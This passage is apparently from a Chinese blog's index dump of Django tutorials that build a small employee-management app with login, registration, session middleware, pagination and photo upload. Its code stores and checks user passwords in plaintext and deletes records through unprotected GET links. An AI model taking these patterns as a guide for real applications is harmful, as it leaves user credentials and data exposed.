request.FILES.get(&#x27;head_pic&#x27;) ext = os.path.splitext(pic.name)[1] # 获取后缀 head_pic = str(uuid.uuid4()) + ext # 拼接后缀名 pic.name = head_pic with transaction.atomic(): Staff.objects.create(name=name, salary=salary, age=age, pic=pic) return redirect(&quot;work:emplist_logic&quot;)# 修改数据逻辑def updateEmp_logic(request): # 根据修改页面的该员工的id id = request.GET.get(&#x27;id&#x27;) print(id) staff = Staff.objects.get(pk=id) # 获取到提交的修改数据 name = request.POST.get(&#x27;name&#x27;) salary = request.POST.get(&#x27;salary&#x27;) age = request.POST.get(&#x27;age&#x27;) # 修改图片 pic = request.FILES.get(&#x27;head_pic&#x27;) ext = os.path.splitext(pic.name)[1] # 获取后缀 head_pic = str(uuid.uuid4()) + ext # 拼接后缀名 pic.name = head_pic # 进行员工的信息修改 with transaction.atomic(): staff.name = name staff.salary = salary staff.age = age staff.pic = pic staff.save() return redirect(&quot;work:emplist&quot;)# 删除员工def delete_logic(request): with transaction.atomic(): id = request.GET.get(&#x27;id&#x27;) staff = Staff.objects.filter(pk=id) staff.delete() return redirect(&#x27;work:emplist&#x27;)# 主页逻辑def emplist_logic(request): # 分页需要导包Paginator num =request.GET.get(&#x27;num&#x27;,1) paginator = Paginator(Staff.objects.all(), per_page=3) #每页显示3条数据 page = paginator.page(num) #构建页面对象 return render(request, &#x27;work/emplist.html&#x27;, &#123;&quot;page&quot;: page&#125;) MyMiddleware 中间件1234567891011121314151617181920212223242526272829303132333435# _*_coding:UTF-8 _*_from django.shortcuts import redirect, renderfrom django.utils.deprecation import MiddlewareMixinclass MyMiddleware(MiddlewareMixin): # 自定义的中间件 def __init__(self, get_response): # 初始化 super().__init__(get_response) print(&quot;中间件已经初始化完毕&quot;) # view处理请求前执行 def process_request(self, request): # 某一个view if &#x27;login&#x27; not in request.path: is_login = request.session.get(&#x27;is_login&#x27;) if is_login: pass elif &#x27;regist&#x27; in request.path: pass elif &quot;getCaptacha&quot; in request.path: pass else: return render(request,&#x27;work/login.html&#x27;) # 在process_request之后View之前执行 def process_view(self, request, view_func, view_args, view_kwargs): print(&quot;view:&quot;, request, view_func, view_args, view_kwargs) # view执行之后，响应之前执行 def process_response(self, request, response): print(&quot;response:&quot;, request, response) return response # 必须返回response # 如果View中抛出了异常 def process_exception(self, request, ex): # View中出现异常时执行 print(&quot;exception:&quot;, request, ex) models1pic = models.ImageField(upload_to=&#x27;pic&#x27;) emplist.html123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142&#123;% load static %&#125;&lt;!DOCTYPE html PUBLIC &quot;-//W3C//DTD HTML 4.01 Transitional//EN&quot; &quot;http://www.w3.org/TR/html4/loose.dtd&quot;&gt;&lt;html&gt;&lt;head&gt; &lt;title&gt;emplist&lt;/title&gt; &lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=UTF-8&quot;&gt; &lt;link rel=&quot;stylesheet&quot; type=&quot;text/css&quot; href=&quot;/static/work/css/style.css&quot;/&gt;&lt;/head&gt;&lt;body&gt;&lt;div id=&quot;wrap&quot;&gt; &lt;div id=&quot;top_content&quot;&gt; &lt;div id=&quot;header&quot;&gt; &lt;div id=&quot;rightheader&quot;&gt; &lt;p&gt; 2009/11/20 &lt;br/&gt; &lt;/p&gt; &lt;/div&gt; &lt;div id=&quot;topheader&quot;&gt; &lt;h1 id=&quot;title&quot;&gt; &lt;a href=&quot;#&quot;&gt;main&lt;/a&gt; &lt;/h1&gt; &lt;/div&gt; &lt;div id=&quot;navigation&quot;&gt; &lt;/div&gt; &lt;/div&gt; &lt;div id=&quot;content&quot;&gt; &lt;p id=&quot;whereami&quot;&gt; &lt;/p&gt; &lt;h1&gt; Welcome! &lt;/h1&gt; &lt;table class=&quot;table&quot;&gt; &lt;tr class=&quot;table_header&quot;&gt; &lt;td&gt; ID &lt;/td&gt; &lt;td&gt; Name &lt;/td&gt; &lt;td&gt; Salary &lt;/td&gt; &lt;td&gt; Age &lt;/td&gt; &lt;td&gt; head_pic &lt;/td&gt; &lt;td&gt; Operation &lt;/td&gt; &lt;/tr&gt; &#123;% for i in page.object_list %&#125; &#123;% if forloop.counter|divisibleby:2 %&#125; &lt;tr class=&quot;row1&quot; style=&quot;background-color: #ffffff&quot;&gt; &lt;td&gt; &#123;&#123; forloop.counter &#125;&#125; &lt;/td&gt; &lt;td&gt; &#123;&#123; i.name &#125;&#125; &lt;/td&gt; &lt;td&gt; &#123;&#123; i.salary &#125;&#125; &lt;/td&gt; &lt;td&gt; &#123;&#123; i.age &#125;&#125; &lt;/td&gt; &lt;td&gt; &lt;img src=&quot;&#123;% static i.pic.url %&#125;&quot; alt=&quot;图片加载失败&quot; height=&quot;70px&quot;&gt; &lt;/td&gt; &lt;td&gt; &lt;a href=&quot;&#123;% url &quot;work:delete_logic&quot; %&#125;?id=&#123;&#123; i.id &#125;&#125;&quot;&gt;delete emp&lt;/a&gt;&amp;nbsp;&lt;a href=&quot;&#123;% url &quot;work:updateemp&quot; %&#125;?id=&#123;&#123; i.id &#125;&#125;&quot;&gt;update emp&lt;/a&gt; &lt;/td&gt; &lt;/tr&gt; &#123;% else %&#125; &lt;tr class=&quot;row2&quot; style=&quot;background-color: #eeeeee&quot;&gt; &lt;td&gt; &#123;&#123; forloop.counter &#125;&#125; &lt;/td&gt; &lt;td&gt; &#123;&#123; i.name &#125;&#125; &lt;/td&gt; &lt;td&gt; &#123;&#123; i.salary &#125;&#125; &lt;/td&gt; &lt;td&gt; &#123;&#123; i.age &#125;&#125; &lt;/td&gt; &lt;td&gt; &lt;img src=&quot;&#123;% static i.pic.url %&#125;&quot; alt=&quot;图片加载失败&quot; height=&quot;70px&quot;&gt; &lt;/td&gt; &lt;td&gt; &lt;a href=&quot;&#123;% url &quot;work:delete_logic&quot; %&#125;?id=&#123;&#123; i.id &#125;&#125;&quot;&gt;delete emp&lt;/a&gt;&amp;nbsp;&lt;a href=&quot;&#123;% url &quot;work:updateemp&quot; %&#125;?id=&#123;&#123; i.id &#125;&#125;&quot;&gt;update emp&lt;/a&gt; &lt;/td&gt; &lt;/tr&gt; &#123;% endif %&#125; &#123;% endfor %&#125; &lt;/table&gt; &#123;% if page.has_previous %&#125; &lt;a href=&quot;&#123;% url &#x27;work:emplist_logic&#x27; %&#125;?num=&#123;&#123; page.previous_page_number &#125;&#125;&quot;&gt; 上一页&lt;/a&gt; &#123;% endif %&#125; &#123;% for foo in page.paginator.page_range %&#125; &lt;a href=&quot;&#123;% url &#x27;work:emplist_logic&#x27; %&#125;?num=&#123;&#123; foo &#125;&#125;&quot;&gt; &#123;% if foo == page.number %&#125; &lt;span class=&quot;b&quot;&gt;&#123;&#123; foo &#125;&#125;&lt;/span&gt; &#123;% else %&#125; &lt;span class=&quot;a&quot;&gt;&#123;&#123; foo &#125;&#125;&lt;/span&gt; &#123;% endif %&#125; &lt;/a&gt; &#123;% endfor %&#125; &#123;% if page.has_next %&#125; &lt;a href=&quot;&#123;% url &#x27;work:emplist_logic&#x27; %&#125;?num=&#123;&#123; page.next_page_number &#125;&#125;&quot;&gt; 下一页&lt;/a&gt; &#123;% endif %&#125; &#123;% if not page.paginator.num_pages == page.number %&#125; &lt;a href=&quot;&#123;% url &#x27;work:emplist_logic&#x27; %&#125;?num=&#123;&#123; page.paginator.num_pages &#125;&#125;&quot;&gt;尾页&lt;/a&gt; &#123;% endif %&#125; &lt;form action=&quot;&#123;% url &#x27;work:emplist_logic&#x27; %&#125;&quot; method=&quot;get&quot;&gt; 输入页号&lt;input type=&quot;text&quot; name=&quot;num&quot;&gt; &lt;input type=&quot;submit&quot; value=&quot;跳转&quot;&gt; &lt;p&gt; &lt;input type=&quot;button&quot; class=&quot;button&quot; value=&quot;Add Employee&quot; onclick=&quot;location=&#x27;&#123;% url &quot;work:addemp&quot; %&#125;&#x27;&quot;/&gt; &lt;/p&gt; &lt;/form&gt; &lt;/div&gt; &lt;/div&gt; &lt;div id=&quot;footer&quot;&gt; &lt;div id=&quot;footer_bg&quot;&gt; ABC@126.com &lt;/div&gt; &lt;/div&gt;&lt;/div&gt;&lt;/body&gt;&lt;/html&gt; regist.html123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103&lt;!DOCTYPE html PUBLIC &quot;-//W3C//DTD HTML 4.01 Transitional//EN&quot; &quot;http://www.w3.org/TR/html4/loose.dtd&quot;&gt;&lt;html&gt; &lt;head&gt; &lt;title&gt;regist&lt;/title&gt; &lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=UTF-8&quot;&gt; &lt;link rel=&quot;stylesheet&quot; type=&quot;text/css&quot; href=&quot;/static/work/css/style.css&quot; /&gt; &lt;script&gt; function f() &#123; var img = document.getElementById(&#x27;img1&#x27;) img.src = &quot;&#123;% url &#x27;work:getCaptacha&#x27; %&#125;?&quot;+new Date().getTime() &#125; &lt;/script&gt; &lt;/head&gt; &lt;body&gt; &lt;div id=&quot;wrap&quot;&gt; &lt;div id=&quot;top_content&quot;&gt; &lt;div id=&quot;header&quot;&gt; &lt;div id=&quot;rightheader&quot;&gt; &lt;p&gt; 2009/11/20 &lt;br /&gt; &lt;/p&gt; &lt;/div&gt; &lt;div id=&quot;topheader&quot;&gt; &lt;h1 id=&quot;title&quot;&gt; &lt;a href=&quot;#&quot;&gt;main&lt;/a&gt; &lt;/h1&gt; &lt;/div&gt; &lt;div id=&quot;navigation&quot;&gt; &lt;/div&gt; &lt;/div&gt; &lt;div id=&quot;content&quot;&gt; &lt;p id=&quot;whereami&quot;&gt; &lt;/p&gt; &lt;h1&gt; 注册 &lt;/h1&gt; &lt;form action=&quot;&#123;% url &quot;work:regist_logic&quot; %&#125;&quot; method=&quot;post&quot;&gt; &#123;% csrf_token %&#125; &lt;table cellpadding=&quot;0&quot; cellspacing=&quot;0&quot; border=&quot;0&quot; class=&quot;form_table&quot;&gt; &lt;tr&gt; &lt;td valign=&quot;middle&quot; align=&quot;right&quot;&gt; 用户名: &lt;/td&gt; &lt;td valign=&quot;middle&quot; align=&quot;left&quot;&gt; &lt;input type=&quot;text&quot; class=&quot;inputgri&quot; name=&quot;username&quot; /&gt; &lt;/td&gt; &lt;/tr&gt; &lt;tr&gt; &lt;td valign=&quot;middle&quot; align=&quot;right&quot;&gt; 真实姓名: &lt;/td&gt; &lt;td valign=&quot;middle&quot; align=&quot;left&quot;&gt; &lt;input type=&quot;text&quot; class=&quot;inputgri&quot; name=&quot;name&quot; /&gt; &lt;/td&gt; &lt;/tr&gt; &lt;tr&gt; &lt;td valign=&quot;middle&quot; align=&quot;right&quot;&gt; 密码: &lt;/td&gt; &lt;td valign=&quot;middle&quot; align=&quot;left&quot;&gt; &lt;input type=&quot;password&quot; class=&quot;inputgri&quot; name=&quot;pwd&quot; /&gt; &lt;/td&gt; &lt;/tr&gt; &lt;tr&gt; &lt;td valign=&quot;middle&quot; align=&quot;right&quot;&gt; 性别: &lt;/td&gt; &lt;td valign=&quot;middle&quot; align=&quot;left&quot;&gt; 男 &lt;input type=&quot;radio&quot; class=&quot;inputgri&quot; name=&quot;sex&quot; value=&quot;m&quot; checked=&quot;checked&quot;/&gt; 女 &lt;input type=&quot;radio&quot; class=&quot;inputgri&quot; name=&quot;sex&quot; value=&quot;f&quot;/&gt; &lt;/td&gt; &lt;/tr&gt; &lt;tr&gt; &lt;td valign=&quot;middle&quot; align=&quot;right&quot;&gt; 验证码: &lt;img id=&quot;img1&quot; src=&quot;&#123;% url &#x27;work:getCaptacha&#x27; %&#125;&quot; width=&quot;70px&quot;/&gt; &lt;a href=&quot;javascript:void(0)&quot; onclick=&quot;f()&quot;&gt;换一张&lt;/a&gt; &lt;/td&gt; &lt;td valign=&quot;middle&quot; align=&quot;left&quot;&gt; &lt;input type=&quot;text&quot; class=&quot;inputgri&quot; name=&quot;captcha&quot; /&gt; &lt;/td&gt; &lt;/tr&gt; &lt;/table&gt; &lt;p&gt; &lt;input type=&quot;submit&quot; class=&quot;button&quot; value=&quot;Submit &amp;raquo;&quot; /&gt; &lt;/p&gt; &lt;/form&gt; &lt;/div&gt; &lt;/div&gt; &lt;div id=&quot;footer&quot;&gt; &lt;div id=&quot;footer_bg&quot;&gt; ABC@126.com &lt;/div&gt; &lt;/div&gt; &lt;/div&gt; &lt;/body&gt;&lt;/html&gt; updateEmp.html123456789&lt;tr&gt; &lt;td valign=&quot;middle&quot; align=&quot;right&quot;&gt; head_pic: &lt;/td&gt; &lt;td valign=&quot;middle&quot; align=&quot;left&quot;&gt; &lt;img src=&quot;&#123;% static staff.pic.url%&#125;&quot; alt=&quot;图片加载失败&quot; height=&quot;70px&quot;&gt; &lt;input type=&quot;file&quot; name=&quot;head_pic&quot;&gt; &lt;/td&gt;&lt;/tr&gt;","categories":[],"tags":[{"name":"Django","slug":"Django","permalink":"http://example.com/tags/Django/"}]},{"title":"Django-实现简易员工操作","slug":"Django-实现简易员工操作","date":"2020-08-23T10:27:24.000Z","updated":"2022-04-08T14:29:40.234Z","comments":true,"path":"2020/08/23/Django-实现简易员工操作/","permalink":"http://example.com/2020/08/23/Django-%E5%AE%9E%E7%8E%B0%E7%AE%80%E6%98%93%E5%91%98%E5%B7%A5%E6%93%8D%E4%BD%9C/","excerpt":"Django实现用户登陆,注册,以及session会话强制登陆,以及对员工的信息的增加,删除,修改操作","text":"Django实现用户登陆,注册,以及session会话强制登陆,以及对员工的信息的增加,删除,修改操作 Django实现简易的员工操作Django实现用户登陆,注册,以及session会话强制登陆,以及对员工的信息的增加,删除,修改操作 结构 model模型创建APP,挂载APP,创建用户表和员工表 1234567891011121314from django.db import models# Create your models here.class User(models.Model): username = models.CharField(max_length=20) name =models.CharField(max_length=20,default=None,null=True) userpwd = models.CharField(max_length=20) sex = models.CharField(max_length=20)class Staff(models.Model): name = models.CharField(max_length=20) salary = models.IntegerField() age = models.IntegerField() 执行python manage.py makemigrations ,以及 python manage migrations views.py视图12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485868788899091929394959697from django.http import HttpResponsefrom django.shortcuts import render, redirectfrom work.models import User, Staff# 主页面def emplist(request): # 判断是否存在session,不存在强制返回登陆界面 res = request.session.get(&#x27;is_login&#x27;) if res: return redirect(&quot;work:emplist_logic&quot;) # 存在session,返回员工页面 return redirect(&#x27;work:login&#x27;) # 不存在session,强制返回为登陆页面# 登陆页面def login(request): # 判断密码是否正确,正确设置session为True username = request.POST.get(&#x27;name&#x27;) userpwd = request.POST.get(&#x27;pwd&#x27;) res = User.objects.filter(username=username, userpwd=userpwd) if res: request.session[&#x27;is_login&#x27;] = True # 密码正确,设置session return redirect(&quot;work:emplist&quot;) # 重定向到员工页面 else: return render(request, &quot;work/login.html&quot;) # 密码错误.返回登陆页面重新登陆# 注册页面def regist(request): return render(request, &quot;work/regist.html&quot;)# 添加员工页面def addEmp(request): return render(request, &quot;work/addEmp.html&quot;)# 修改员工页面def updateEmp(request): # 填写获取的该员工信息 id = request.GET.get(&#x27;id&#x27;) staff = Staff.objects.get(pk=id) return render(request, &quot;work/updateEmp.html&quot;, &#123;&quot;staff&quot;: staff&#125;)# 登陆逻辑def login_logic(request): username = request.POST.get(&quot;name&quot;) userpwd = request.POST.get(&quot;pwd&quot;) res = User.objects.filter(username=username, userpwd=userpwd) if res: request.session[&#x27;is_login&#x27;] = True # 登陆正确设置及session会话 return redirect(&quot;work:emplist&quot;) # 重定向到员工页面 return render(request, &quot;work/login.html&quot;) # 密码错误,返回登陆页面重新登陆# 注册逻辑def regist_logic(request): username = request.POST.get(&quot;username&quot;) name = request.POST.get(&quot;name&quot;) userpwd = request.POST.get(&quot;pwd&quot;) sex = request.POST.get(&quot;sex&quot;) res = User.objects.filter(username=username) # 获取数据库是否拥有用户名 if res: return HttpResponse(&quot;用户已存在&quot;) User.objects.create(username=username, name=name, userpwd=userpwd, sex=sex) return redirect(&quot;work:login&quot;)# 添加员工逻辑def addEmp_logic(request): name = request.POST.get(&#x27;name&#x27;) salary = request.POST.get(&#x27;salary&#x27;) age = request.POST.get(&#x27;age&#x27;) Staff.objects.create(name=name, salary=salary, age=age) return redirect(&quot;work:emplist_logic&quot;)# 修改数据逻辑def updateEmp_logic(request): # 根据修改页面的该员工的id id = request.GET.get(&#x27;id&#x27;) print(id) staff = Staff.objects.get(pk=id) # 获取到提交的修改数据 name = request.POST.get(&#x27;name&#x27;) salary = request.POST.get(&#x27;salary&#x27;) age = request.POST.get(&#x27;age&#x27;) # 进行员工的信息修改 staff.name = name staff.salary = salary staff.age = age staff.save() return redirect(&quot;work:emplist&quot;)# 删除员工def delete_logic(request): id = request.GET.get(&#x27;id&#x27;) staff = Staff.objects.filter(pk=id) staff.delete() return redirect(&#x27;work:emplist&#x27;)# 主页逻辑def emplist_logic(request): staff = Staff.objects.all() print(len(staff)) return render(request, &#x27;work/emplist.html&#x27;, &#123;&quot;staff&quot;: staff&#125;) urls.py12345678910111213141516171819# _*_coding:UTF-8 _*_from django.urls import path, from work import viewsapp_name = &quot;work&quot; #app名称urlpatterns = [ path(&#x27;emplist/&#x27;, views.emplist,name=&quot;emplist&quot;), path(&#x27;login/&#x27;, views.login,name=&quot;login&quot;), path(&#x27;regist/&#x27;, views.regist,name=&quot;regist&quot;), path(&#x27;login_logic/&#x27;, views.login_logic,name=&quot;login_logic&quot;), path(&#x27;regist_logic/&#x27;, views.regist_logic,name=&quot;regist_logic&quot;), path(&#x27;addemp/&#x27;, views.addEmp,name=&quot;addemp&quot;), path(&#x27;updateemp/&#x27;, views.updateEmp,name=&quot;updateemp&quot;), path(&#x27;addemp_logic/&#x27;, views.addEmp_logic,name=&quot;addemp_logic&quot;), path(&#x27;updateemp_logic/&#x27;, views.updateEmp_logic,name=&quot;updateemp_logic&quot;), path(&#x27;delete_logic/&#x27;, views.delete_logic,name=&quot;delete_logic&quot;), path(&#x27;emplist_logic/&#x27;, views.emplist_logic,name=&quot;emplist_logic&quot;),] static静态样式cssbody&#123; margin: 0; font-size: 62.5%; font-family: Verdana, Arial, Helvetica, sans-serif; padding: 15px 0; background: #eeeeee;&#125;#wrap &#123; width: 820px; margin: 0 auto; background: url(../img/all/bg.gif) top repeat-y #FFFFFF;&#125;#top_content &#123; padding: 0 10px;&#125;#topheader &#123; padding: 25px 15px 15px 15px; margin: 0 auto 0 auto; background: url(../img/all/top_left.gif) top left repeat-x #85C329;&#125;#rightheader &#123; float: right; width: 375px; height: 40px; color: #FFFFFF; text-align: right;&#125;#rightheader p &#123; padding: 35px 15px 0 0; margin: 0; text-align: right;&#125;#rightheader p span &#123; font-weight: bold;&#125;#rightheader a:link, #rightheader a:visited &#123; color: #FFFFFF; text-decoration: underline;&#125;#title &#123; padding: 0; margin: 0; font-size: 2.5em; color: #FFFFFF;&#125;#title span &#123; font-size: 0.5em; font-style: italic;&#125;#title a:link, #title a:visited &#123; color: #FFFFFF; text-decoration: none;&#125;#title a:hover &#123; color: #E1F3C7;&#125;#navigation &#123; background: #74A8F5; border-top: 1px solid #ffffff; height: 25px; clear: both&#125;#navigation ul &#123; padding: 0; margin: 0; list-style: none; font-size: 1.1em; height: 25px;&#125;#navigation ul li &#123; display: inline;&#125;#navigation ul li a &#123; color: #FFFFFF; display: block; text-decoration: none; float: left; line-height: 25px; padding: 0 16px; border-right: 1px solid #ffffff;&#125;#navigation ul li a:hover &#123; background: #5494F3;&#125;#content &#123; padding: 0 15px; margin: 0 auto 0 auto; background: url(../img/all/content_bg.gif) repeat-x left top #ffffff; color: #666666;&#125;#content p#whereami &#123; padding: 20px 0 15px 0; margin: 0;&#125;#whereami a:link, #whereami a:visited &#123; color: #73A822; text-decoration: underline;&#125;#content h1, #content h2,#content h3, #content h4 , #content h5 &#123; color: #74A8F5;&#125;#content h1 &#123; font-family: &quot;Trebuchet MS&quot;, Arial, Helvetica; padding: 0; margin: 0 0 15px 0; font-size: 2em;&#125;#content h2 &#123; font-family: &quot;Trebuchet MS&quot;, Arial, Helvetica; padding: 0; margin: 0 0 15px 0; font-size: 1.5em;&#125;#top_body, #content_body &#123; padding: 0 25px;&#125;#footer &#123; background: url(../img/all/footer.gif) no-repeat center bottom ; color: #FFFFFF; padding: 0 10px 13px 10px;&#125;#footer p &#123; padding: 0; margin: 0;&#125;#footer p a:link, #footer p a:visited &#123; color: #FFFFFF; font-style: italic; text-decoration: none;&#125;#footer #footer_bg &#123; background: url(../img/all/footer_bg.gif) repeat-x left bottom #85C329; padding: 15px 15px 25px 15px; border-top: 1px solid #7BB425;&#125;#footer #design &#123; display: block; width: 150px; height: 30px; float: right; line-height: 20px; padding: 0 5px; text-align: right; color: #E1F3C7;&#125;#footer #design a &#123; color: #FFFFFF; text-decoration: underline;&#125;.table &#123; margin-bottom: 15px; width: 100%; border-collapse: collapse;&#125;.table_header td &#123; background: url(../img/all/tableheader-bg.gif) no-repeat left top; padding: 5px 10px; color: rgb(70,122,167); border-top: 1px solid #CBD6DE; border-bottom: 1px solid #ADBECB; font-size: 1.1em; font-weight: bold;&#125;.table_header td a:link, .table_header td a:visited &#123; text-decoration: underline; color: rgb(70,122,167);&#125;.table_header td a:hover &#123; text-decoration: underline; color: #73A822;&#125;.table_header td &#123; border: 1px solid #CBD6DE;&#125;.row1 td, .row2 td, .row_hover td, .paging_row td &#123; padding: 5px 10px; color: #666666; border: 1px solid #CBD6DE;&#125;.row1 td &#123; background: #ffffff;&#125;.row2 td &#123; background: #eeeeee;&#125;.row_hover td &#123; background: #FBFACE; color: #000000;&#125;.hidden &#123; display: none;&#125;.little &#123; font-size: 10px;&#125;.clear &#123; clear: both;&#125;.img_left &#123; float: left; padding: 1px; border: 1px solid #cccccc; margin: 0 10px 10px 0; width: 110px; height:150px;&#125;/* #content ul basic style for unordered lists------------------------------------------------*/#content ul &#123; font-size: 1.1em; line-height: 1.8em; margin: 0 0 15px 0; padding: 0; list-style-type: none;&#125;/* #content p paragraphs-----------------------------*/#content p &#123; font-size: 1.2em; margin: 0; padding: 0 0 15px 0;&#125;/* #content p a links in paragraphs------------------------------------*/#content p a:link, #content p a:visited,.table a:link, .table a:visited,.link a &#123; color: #73A822; text-decoration: none;&#125;#content p a:hover, .table a:hover, .link a:hover &#123; text-decoration: underline;&#125;/* #content ul.green (73A822)--------------------------------*/#content ul.green li &#123; padding: 0 0 0 20px; margin: 0; background: url(../img/all/bullet_green.gif) no-repeat 1px 3px; font-size: 1.1em;&#125;#content ul.green li a:link, #content ul.green li a:visited &#123; color: #73A822; text-decoration: none;&#125;#content ul.green li a:hover &#123; color: #73A822; text-decoration: underline;&#125;/* #content ul.black (73A822)--------------------------------*/#content ul.black li &#123; padding: 0 0 0 20px; margin: 0; background: url(../img/all/bullet_grey.gif) no-repeat 1px 3px; font-size: 1.1em;&#125;#content ul.black li a:link, #content ul.black li a:visited &#123; color: #666666; text-decoration: none;&#125;#content ul.black li a:hover &#123; color: #999999; text-decoration: underline;&#125;/* #content ol--------------------------------*/#content ol &#123; padding: 0 0 0 25px; margin: 0 0 15px 0; line-height: 1.8em;&#125;#content ol li &#123; font-size: 1.1em;&#125;#content ol li a:link, #content ol li a:visited &#123; color: #73A822; text-decoration: none;&#125;#content ol li a:hover &#123; color: #73A822; text-decoration: underline;&#125;/* #content p.paging ---------------------------------*/#content p.paging &#123;padding: 5px;border: 1px solid #CBD6DE;text-align: center;margin-bottom: 15px;background: #eeeeee;&#125;/* .small_input smaller text in inputs/combos-----------------------------------------------*/.small_input &#123; font-size: 10px;&#125;/* .form_table style for table used in forms---------------------------------------------*/.form_table &#123; margin-bottom: 15px; font-size: 1.1em;&#125;.form_table p &#123; margin: 0; padding: 0;&#125;.form_table td &#123; padding: 5px 10px;&#125;/* .checkbox_nomargins clear all margins from a checkbox---------------------------------------------------------*/.checkbox_nomargins &#123; /*margin:0;width:13px;height:13px;overflow:hidden; font-size: 10px;*/ margin: 0; padding: 0;&#125;/* .button some buttons style - inspired from wordpress------------------------------*/input.button &#123; margin: 0; padding: 2px; border: 3px double #999999; border-left-color: #ccc; border-top-color: #ccc; background: url(../img/all/button.gif) repeat-x left top; font-size: 11px; font-family: Verdana, Arial, Helvetica, sans-serif;&#125;/* form style for forms-------------------------*/form &#123; padding: 0; margin: 0;&#125;/* input.inputgri - some style for inputs--------------------------------------------*/input.inputgri, select.inputgri, textarea.inputgri &#123; background: #eeeeee; font-size: 14px; border: 1px solid #cccccc; padding: 3px;&#125;input.inputgri:focus, select.inputgri:focus , textarea.inputgri:focus &#123; background: #ffffff; border: 1px solid #686868;&#125;/* .notice - messages to user--------------------------------*/.notice &#123; background: #CAEA99; border: 1px solid #70A522; padding: 15px 15px 15px 15px; margin-bottom: 15px; font-size: 1.2em; color: #333333;&#125;.notice_error &#123; background: #FEDCDA; border: 1px solid #CE090E; padding: 15px 15px 15px 15px; margin-bottom: 15px; font-size: 1.2em; color: #333333;&#125;#notice a &#123; color: #333333; text-decoration: underline;&#125;/* Other links ----------------*/.other_links &#123; background: #eeeeee; border-top: 1px solid #cccccc; padding: 5px; margin: 0 0 15px 0;&#125;#content .other_links h2 &#123; color: #999999; padding: 0 0 0 3px; margin: 0;&#125;#content .other_links ul &#123; padding: 0; margin: 0;&#125;#content .other_links ul li &#123; padding: 0 0 0 20px; background: url(../img/all/bullet_grey.gif) no-repeat left center;&#125;#content .other_links a, #content .other_links a:visited &#123; color: #999999; text-decoration: underline;&#125;#content .other_links a:hover &#123; color: #666666;&#125;/* code */code &#123; font-size: 1.2em; color: #73A822;&#125; HTMLemplist.html123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108&lt;!DOCTYPE html PUBLIC &quot;-//W3C//DTD HTML 4.01 Transitional//EN&quot; &quot;http://www.w3.org/TR/html4/loose.dtd&quot;&gt;&lt;html&gt; &lt;head&gt; &lt;title&gt;emplist&lt;/title&gt; &lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=UTF-8&quot;&gt; &lt;link rel=&quot;stylesheet&quot; type=&quot;text/css&quot; href=&quot;/static/work/css/style.css&quot; /&gt; &lt;/head&gt; &lt;body&gt; &lt;div id=&quot;wrap&quot;&gt; &lt;div id=&quot;top_content&quot;&gt; &lt;div id=&quot;header&quot;&gt; &lt;div id=&quot;rightheader&quot;&gt; &lt;p&gt; 2009/11/20 &lt;br /&gt; &lt;/p&gt; &lt;/div&gt; &lt;div id=&quot;topheader&quot;&gt; &lt;h1 id=&quot;title&quot;&gt; &lt;a href=&quot;#&quot;&gt;main&lt;/a&gt; &lt;/h1&gt; &lt;/div&gt; &lt;div id=&quot;navigation&quot;&gt; &lt;/div&gt; &lt;/div&gt; &lt;div id=&quot;content&quot;&gt; &lt;p id=&quot;whereami&quot;&gt; &lt;/p&gt; &lt;h1&gt; Welcome! &lt;/h1&gt; &lt;table class=&quot;table&quot;&gt; &lt;tr class=&quot;table_header&quot;&gt; &lt;td&gt; ID &lt;/td&gt; &lt;td&gt; Name &lt;/td&gt; &lt;td&gt; Salary &lt;/td&gt; &lt;td&gt; Age &lt;/td&gt; &lt;td&gt; Operation &lt;/td&gt; &lt;/tr&gt; &#123;% for i in staff %&#125; &#123;% if forloop.counter|divisibleby:2 %&#125; &lt;tr class=&quot;row1&quot; style=&quot;background-color: #ffffff&quot;&gt; &lt;td&gt; &#123;&#123; forloop.counter &#125;&#125; &lt;/td&gt; &lt;td&gt; &#123;&#123; i.name &#125;&#125; &lt;/td&gt; &lt;td&gt; &#123;&#123; i.salary &#125;&#125; &lt;/td&gt; &lt;td&gt; &#123;&#123; i.age &#125;&#125; &lt;/td&gt; &lt;td&gt; &lt;a href=&quot;&#123;% url &quot;work:delete_logic&quot; %&#125;?id=&#123;&#123; i.id &#125;&#125;&quot;&gt;delete emp&lt;/a&gt;&amp;nbsp;&lt;a href=&quot;&#123;% url &quot;work:updateemp&quot; %&#125;?id=&#123;&#123; i.id &#125;&#125;&quot;&gt;update emp&lt;/a&gt; &lt;/td&gt; &lt;/tr&gt; &#123;% else %&#125; &lt;tr class=&quot;row2&quot; style=&quot;background-color: #eeeeee&quot;&gt; &lt;td&gt; &#123;&#123; forloop.counter &#125;&#125; &lt;/td&gt; &lt;td&gt; &#123;&#123; i.name &#125;&#125; &lt;/td&gt; &lt;td&gt; &#123;&#123; i.salary &#125;&#125; &lt;/td&gt; &lt;td&gt; &#123;&#123; i.age &#125;&#125; &lt;/td&gt; &lt;td&gt; &lt;a href=&quot;&#123;% url &quot;work:delete_logic&quot; %&#125;?id=&#123;&#123; i.id &#125;&#125;&quot;&gt;delete emp&lt;/a&gt;&amp;nbsp;&lt;a href=&quot;&#123;% url &quot;work:updateemp&quot; %&#125;?id=&#123;&#123; i.id &#125;&#125;&quot;&gt;update emp&lt;/a&gt; &lt;/td&gt; &lt;/tr&gt; &#123;% endif %&#125; &#123;% endfor %&#125; &lt;/table&gt; &lt;p&gt; &lt;input type=&quot;button&quot; class=&quot;button&quot; value=&quot;Add Employee&quot; onclick=&quot;location=&#x27;&#123;% url &quot;work:addemp&quot; %&#125;&#x27;&quot;/&gt; &lt;/p&gt; &lt;/div&gt; &lt;/div&gt; &lt;div id=&quot;footer&quot;&gt; &lt;div id=&quot;footer_bg&quot;&gt; ABC@126.com &lt;/div&gt; &lt;/div&gt; &lt;/div&gt; &lt;/body&gt;&lt;/html&gt; login.html123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869&lt;!DOCTYPE html PUBLIC 